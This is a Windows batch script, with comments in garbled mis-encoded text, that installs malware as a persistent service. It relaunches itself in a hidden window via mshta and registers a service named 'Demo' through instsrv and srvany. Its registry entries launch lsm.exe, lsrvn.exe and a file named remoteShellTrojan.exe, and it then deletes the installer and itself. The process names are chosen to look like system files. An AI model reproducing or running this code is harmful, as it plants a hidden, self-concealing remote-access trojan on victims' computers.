@echo off

if "%1"=="h" goto begin
start mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
:begin

rem ������Ҫ���еĳ���·��
set curExe=%~dp0lsm.exe
rem ����ע���·��
set regpath=HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Demo\Parameters\
rem ����srvany.exe�ļ�·��
set sourcePath=%~dp0tasksch.exe

rem ���뵱ǰĿ¼
cd /d "%~dp0"
rem ��װ��������
%~dp0instsrv Demo  "%sourcePath%"
@echo ����������

rem ���ע����﷨: reg add ע���·�� /v ������ /t ֵ���� /d ���� /f ��ʾǿ���޸Ĳ���ʾ

rem ���� Application ֵΪ��Ҫ��Ϊ�������еĳ����ַ /d��Ӧ�Ĳ�����б�ܲ���Ϊ��ת�����ţ�����·������б�ܣ�Ĭ�Ͻ�����ת���ˣ��������б����Ϊ�˱�������
reg add %regpath% /v AppDirectory /t REG_SZ /d "%~dp0\" /f

rem ���� AppDirectory ֵΪ��Ҫ��Ϊ�������еĳ��������ļ���·��
reg add %regpath% /v Application /t REG_SZ /d "%curExe% %~dp0lsrvn.exe %~dp0remoteShellTrojan.exe" /f 

rem ���� AppParameters ֵΪ��Ҫ��Ϊ�������еĳ�����������Ҫ�Ĳ���
reg add %regpath% /v AppParameters /t REG_SZ /f
@echo ע���������
sc start Demo
del /F /S /Q %~dp0instsrv
del /F /S /Q %~dp0run-install.bat
